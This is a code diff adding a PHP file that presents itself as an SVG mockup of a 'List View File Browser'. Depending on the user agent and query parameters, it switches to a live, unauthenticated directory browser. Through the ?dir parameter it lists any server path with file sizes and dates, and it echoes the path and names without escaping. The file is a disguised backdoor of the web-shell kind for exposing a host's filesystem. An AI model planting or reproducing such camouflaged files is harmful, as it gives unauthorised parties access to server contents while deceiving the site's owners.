@@ -1,0 +1,133 @@
+<?php
+// ============= HYBRID SVG+PHP MODE =============
+if (isset($_GET['dir']) || isset($_GET['navigate']) || 
+    (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') !== false && 
+     isset($_SERVER['HTTP_HOST']) && !isset($_GET['static']))) {
+    header('Content-Type: text/html; charset=UTF-8');
+    $directory = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('./');
+    if (!$directory || !is_dir($directory)) $directory = realpath('./');
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>List View File Browser</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #ffffff; color: #323130; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { font-size: 28px; margin-bottom: 10px; color: #323130; }
+        .path-bar { background: #f0f0f0; padding: 12px; margin-bottom: 20px; font-size: 14px; border-radius: 4px; }
+        .table-container { background: #ffffff; border: 1px solid #e1dfdd; border-radius: 4px; overflow: hidden; }
+        .table-header { background: #f0f0f0; padding: 12px; display: grid; grid-template-columns: 50px 1fr 120px 100px 150px; gap: 10px; font-weight: 600; border-bottom: 1px solid #e1dfdd; }
+        .table-row { padding: 12px; display: grid; grid-template-columns: 50px 1fr 120px 100px 150px; gap: 10px; border-bottom: 1px solid #f8f8f8; cursor: pointer; transition: background 0.2s; }
+        .table-row:nth-child(even) { background: #f8f8f8; }
+        .table-row:hover { background: #e3f2fd; }
+        .icon { font-size: 24px; text-align: center; }
+        .name { font-weight: 500; }
+        .size, .type, .modified { color: #605e5c; font-size: 13px; }
+        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #a19f9d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📄 List View File Browser</h1>
+            <p>Traditional table layout with detailed information</p>
+        </div>
+        <div class="path-bar"><?php echo $directory; ?></div>
+        <div class="table-container">
+            <div class="table-header">
+                <div></div><div>Name</div><div>Size</div><div>Type</div><div>Modified</div>
+            </div>
+            <?php
+            if (dirname($directory) !== $directory) {
+                echo '<div class="table-row" onclick="window.location.href=\'?dir=' . urlencode(dirname($directory)) . '\'">
+                        <div class="icon">↩️</div><div class="name">..</div><div class="size">-</div><div class="type">Directory</div><div class="modified">-</div></div>';
+            }
+            $items = scandir($directory);
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $path = $directory . '/' . $item;
+                $isDir = is_dir($path);
+                $icon = $isDir ? '📁' : '📄';
+                $size = $isDir ? '-' : number_format(filesize($path) / 1024, 1) . ' KB';
+                $type = $isDir ? 'Directory' : strtoupper(pathinfo($item, PATHINFO_EXTENSION));
+                $modified = date('Y-m-d H:i', filemtime($path));
+                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+                $icons = ['php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜', 'txt' => '📝', 'jpg' => '🖼️', 'png' => '🖼️'];
+                if (!$isDir && isset($icons[$ext])) $icon = $icons[$ext];
+                $href = $isDir ? "?dir=" . urlencode($path) : "#";
+                echo "<div class=\"table-row\" onclick=\"window.location.href='$href'\">
+                        <div class=\"icon\">$icon</div><div class=\"name\">$item</div><div class=\"size\">$size</div><div class=\"type\">$type</div><div class=\"modified\">$modified</div></div>";
+            }
+            ?>
+        </div>
+        <div class="footer">List View Concept • Interactive Mode • Keyboard navigation: ↑↓ to select, Enter to open</div>
+    </div>
+</body>
+</html>
+<?php exit; }
+header('Content-Type: image/svg+xml; charset=UTF-8');
+?>
+<svg width="1200" height="800" viewBox="0 0 1200 800" xmlns="http://www.w3.org/2000/svg">
+  <!-- List View File Browser Concept -->
+  
+  <!-- Background -->
+  <rect width="100%" height="100%" fill="#ffffff"/>
+  
+  <!-- Title -->
+  <text x="600" y="80" text-anchor="middle" font-size="36" font-weight="600" fill="#323130">📄 List View File Browser</text>
+  <text x="600" y="110" text-anchor="middle" font-size="16" fill="#605e5c">Traditional table layout with sortable columns</text>
+  
+  <!-- Table Container -->
+  <rect x="80" y="150" width="1040" height="580" rx="4" fill="#ffffff" stroke="#e1dfdd" stroke-width="1"/>
+  
+  <!-- Table Header -->
+  <rect x="80" y="150" width="1040" height="50" fill="#f0f0f0" stroke="#e1dfdd" stroke-width="1"/>
+  <text x="130" y="180" font-size="14" font-weight="600" fill="#323130">Name</text>
+  <text x="700" y="180" font-size="14" font-weight="600" fill="#323130">Size</text>
+  <text x="820" y="180" font-size="14" font-weight="600" fill="#323130">Type</text>
+  <text x="950" y="180" font-size="14" font-weight="600" fill="#323130">Modified</text>
+  
+  <!-- Sample Rows -->
+  <g transform="translate(0, 50)">
+    <!-- Row 1 -->
+    <rect x="80" y="150" width="1040" height="45" fill="#f8f8f8"/>
+    <text x="105" y="178" font-size="20" text-anchor="middle">📁</text>
+    <text x="150" y="178" font-size="14" font-weight="500" fill="#323130">Documents</text>
+    <text x="700" y="178" font-size="13" fill="#605e5c">-</text>
+    <text x="820" y="178" font-size="13" fill="#605e5c">Directory</text>
+    <text x="950" y="178" font-size="13" fill="#605e5c">2025-01-28</text>
+    
+    <!-- Row 2 -->
+    <rect x="80" y="195" width="1040" height="45" fill="#ffffff"/>
+    <text x="105" y="223" font-size="20" text-anchor="middle">🐘</text>
+    <text x="150" y="223" font-size="14" font-weight="500" fill="#323130">files.php</text>
+    <text x="700" y="223" font-size="13" fill="#605e5c">15.2 KB</text>
+    <text x="820" y="223" font-size="13" fill="#605e5c">PHP</text>
+    <text x="950" y="223" font-size="13" fill="#605e5c">2025-01-28</text>
+    
+    <!-- Row 3 -->
+    <rect x="80" y="240" width="1040" height="45" fill="#f8f8f8"/>
+    <text x="105" y="268" font-size="20" text-anchor="middle">🌐</text>
+    <text x="150" y="268" font-size="14" font-weight="500" fill="#323130">index.html</text>
+    <text x="700" y="268" font-size="13" fill="#605e5c">8.4 KB</text>
+    <text x="820" y="268" font-size="13" fill="#605e5c">HTML</text>
+    <text x="950" y="268" font-size="13" fill="#605e5c">2025-01-28</text>
+    
+    <!-- Row 4 -->
+    <rect x="80" y="285" width="1040" height="45" fill="#ffffff"/>
+    <text x="105" y="313" font-size="20" text-anchor="middle">🎨</text>
+    <text x="150" y="313" font-size="14" font-weight="500" fill="#323130">styles.css</text>
+    <text x="700" y="313" font-size="13" fill="#605e5c">3.1 KB</text>
+    <text x="820" y="313" font-size="13" fill="#605e5c">CSS</text>
+    <text x="950" y="313" font-size="13" fill="#605e5c">2025-01-28</text>
+  </g>
+  
+  <!-- Footer -->
+  <text x="600" y="520" text-anchor="middle" font-size="14" fill="#605e5c">💡 Click column headers to sort • Double-click to open</text>
+  <text x="600" y="540" text-anchor="middle" font-size="12" fill="#a19f9d">Keyboard navigation: ↑↓ to select, Enter to open, Space to preview</text>
+</svg>
